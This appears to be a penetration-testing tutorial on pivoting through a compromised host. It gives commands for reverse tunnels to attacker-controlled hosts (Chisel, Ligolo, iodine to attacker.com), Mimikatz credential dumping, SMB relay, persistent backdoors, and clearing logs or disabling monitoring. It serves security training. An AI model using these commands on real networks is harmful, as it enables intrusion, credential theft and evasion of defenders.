# Pivoting in Penetration Testing

## Introduction
Pivoting is a crucial technique in penetration testing that allows an attacker to use a compromised system as a bridge to access an otherwise restricted network. This enables lateral movement within an organization’s internal infrastructure. By leveraging pivoting, attackers can bypass security controls like firewalls and access sensitive internal resources.

## Types of Pivoting
1. **Network Pivoting** - Routing traffic through a compromised system to access internal networks.
2. **Port Forwarding** - Exposing services from an internal machine to the attacker's machine.
3. **VPN Pivoting** - Creating a VPN connection to route all traffic through the compromised host.
4. **SOCKS Proxy Pivoting** - Using a SOCKS proxy to tunnel traffic through a compromised host.
5. **Metasploit Pivoting** - Utilizing Metasploit's autoroute and SOCKS modules.
6. **Plink (PuTTY Link) Pivoting** - Using Plink for SSH tunneling.
7. **SSHuttle Pivoting** - Transparently routing traffic through an SSH connection.
8. **RDP Pivoting** - Using Remote Desktop Protocol (RDP) to access internal machines.
9. **ICMP Tunneling** - Encapsulating data within ICMP packets.
10. **DNS Tunneling** - Exfiltrating or tunneling data over DNS queries.

## Step-by-Step Guide to Pivoting

1. ### Compromise an Initial Host
  - Gain access to an external system using exploits, phishing, or credentials.
  - Obtain a shell or remote desktop access.

2. ### Identify Network Interfaces
  - Check available interfaces and network connections:
    ```bash
    ip a
    ip route
    ifconfig
    netstat -rn
    ```

  Identify internal IP ranges that may indicate private networks.

3. ### Enumerate Internal Network
  - Scan internal subnets using: `nmap -sP 10.10.0.0/24`
  - Check for active services: `nmap -sV -p 80,443,3389,445 10.10.0.10`
  - Extract credentials if possible (e.g., from memory dumps or configuration files).

4. ### Establish Pivoting
    - #### SSH Tunneling (Dynamic and Local Port Forwarding)
        - Create a SOCKS proxy to route traffic: `ssh -D 1080 -N user@compromised-host`
        - Use local port forwarding to expose internal services: `ssh -L 8080:10.10.0.10:80 user@compromised-host`
        - Then use ProxyChains
            - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
            - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
    - #### Chisel (Fast TCP/UDP Tunneling)
        - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
        - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
        - Use ProxyChains with Chisel for further tunneling.
    - #### Ligolo (Auto Route Creation)
        - Setup network configuration
          ```bash
              ip tuntap add user root mode tun ligolo
              ip link set ligolo up
          ```
        - On attacker's machine: `./ligolo -reverse -listen :9090`
        - On compromised machine: `./ligolo -connect attacker-ip:9090`
        - Type on proxy
          ```bash
          session
          start
          ifconfig
          ```
        - Configure Internal IP with proper IP (Replace given IP with targets internal ip)
           ```bash
           ip route add 192.168.148.0/24 dev ligolo
           ip route list
           ```
          
    - #### Metasploit Pivoting
        - Use autoroute to add routes through the compromised system: `run autoroute -s 10.10.0.0/24`
        - Use socks4a module to enable ProxyChains:
          ```bash
          use auxiliary/server/socks4a
          set SRVPORT 1080
          exploit
          ```
    - #### SSHuttle Pivoting
        - Transparently route traffic through an SSH connection: `sshuttle -r user@compromised-host 10.10.0.0/24`
    - #### Plink (PuTTY Link) Pivoting
        - Windows-based SSH tunneling: `plink.exe -D 1080 -N user@compromised-host`
    - #### RDP Pivoting
        - Use RDP to connect to internal machines: `xfreerdp /u:user /p:password /v:10.10.0.10`
    - #### ICMP Tunneling
        - Use tools like icmptunnel to route traffic over ICMP: `./icmptunnel -s attacker-ip`
    - #### DNS Tunneling
        - Use iodine to tunnel traffic over DNS: `iodine -f -P password -r attacker.com`
  
5. ### Routing Traffic Through Compromised Host
  - Use Metasploit’s autoroute to configure routes: `run autoroute -s 10.10.0.0/24`
  - Scan the internal network from Metasploit: `run post/multi/manage/autoroute`

6. ### Exploit Further and Move Laterally
  - Use credentials to access other machines (Pass-the-Hash, RDP, SMB, etc.).
  - Dump credentials using Mimikatz:
    ```bash
    mimikatz.exe
    sekurlsa::logonpasswords
    ```
  - Use SMB relay attacks to gain further access.

7. ### Maintain Access and Cover Tracks
  - Set up persistent backdoors (e.g., SSH keys, scheduled tasks).
  - Clear logs and disable security monitoring where possible.

## Conclusion
Pivoting is a powerful technique in penetration testing that allows an attacker to move deeper into a target network. Mastering tools like SSH, Chisel, Ligolo, Metasploit, and ProxyChains enables penetration testers to navigate restricted environments effectively.
